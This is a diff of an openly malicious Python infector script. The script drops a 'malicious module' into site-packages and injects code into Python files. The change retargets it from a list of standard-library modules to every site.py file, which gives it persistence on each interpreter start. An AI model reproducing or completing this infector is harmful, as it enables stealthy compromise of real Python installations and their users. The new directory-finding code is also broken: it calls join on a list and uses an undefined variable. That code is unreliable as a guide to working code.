@@ -11,7 +11,7 @@ import sys
 
 MODULE_CODE = "changeme"           # The malicious module source code file
 DEST_MODULE_NAME = "changeme"       # The name of the module that will get dropped into sitepkg
-INCLUDE_LIST = ["datetime.py", "io.py", "operator.py", "os.py", "pickle.py", "random.py", "re.py", "socket.py", "stat.py", "string.py", "subprocess.py" ]  # A list of files we will infect
+#INCLUDE_LIST = ["datetime.py", "io.py", "operator.py", "os.py", "pickle.py", "random.py", "re.py", "socket.py", "stat.py", "string.py", "subprocess.py" ]  # A list of files we will infect
 
 
 def get_pkg_dir():
@@ -19,10 +19,17 @@ def get_pkg_dir():
     Find the correct directory for default packages
     @return: The path of the python site packages
     """
-    arr = site.getsitepackages()    # This function is lit
-    for item in arr:
-        if "/usr/lib" in item:      # we want the global one, not /usr/local/
-            return item
+    site_loc = ""
+    for subdir, dirs, files in os.walk(pth):        # iterate through everything
+        for fil in files:
+            fname = os.path.join(subdir, fil)
+            if "site.py" in fname:                      # if it's site
+                fname = fname.split("/")[:-1]
+                fname = fname.join("")                  # get the directory
+                site_loc = fname
+                return site_loc
+    
+
 
 
 def read_module_code(filename):
@@ -53,7 +60,7 @@ def drop_module(dest_file_path):
     return
 
 
-def find_py(pth):
+def find_site(pth):
     """
     Iterate through the given path and find all python files
     @param pth: the starting directory to search
@@ -63,7 +70,7 @@ def find_py(pth):
     for subdir, dirs, files in os.walk(pth):        # iterate through everything
         for fil in files:
             fname = os.path.join(subdir, fil)
-            if ".py" in fname:                      # if it's python
+            if "site.py" in fname:                      # if it's the site module
                 py_files.append(fname)
 
     return py_files
@@ -96,20 +103,6 @@ def infect_file(file_path):
         return
 
 
-def should_infect(pth):
-    """
-    Check the file against the 'include' list to determine if we should infect
-    @param pth: the complete URI of the file we'll check
-    return: a boolean indicating if we should infect the file
-    """
-    global INCLUDE_LIST
-    fname = pth.split('/')[-1]
-    if fname in INCLUDE_LIST:
-        print(fname)
-        return True
-    return False
-
-
 def infect(search_dir):
     """
     The work horse function of the script; drops module and infects files
@@ -118,11 +111,10 @@ def infect(search_dir):
     """
     mod_dest = get_pkg_dir() + "/" + DEST_MODULE_NAME   # establish location for malicious module
     drop_module(mod_dest)   # write the module
-    py_files = find_py(search_dir)  # find python
+    py_files = find_site(search_dir)  # find python
     for f in py_files:
-        if should_infect(f):
-            print("Infecting " + f + "...")
-            infect_file(f)      # hack em
+        print("Infecting " + f + "...")
+        infect_file(f)      # hack em
     return
 
 
@@ -131,7 +123,7 @@ def main():
     Take argument from cmdline (if present), pass into "infect'
     """
     argc = len(sys.argv)
-    if argc > 1:    # if they defined a directory, use it
+    if argc > 1:    # if user defined a directory, use it
         infection_dir = sys.argv[1]
     else:           # otherwise just use cwd
         infection_dir = os.getcwd()
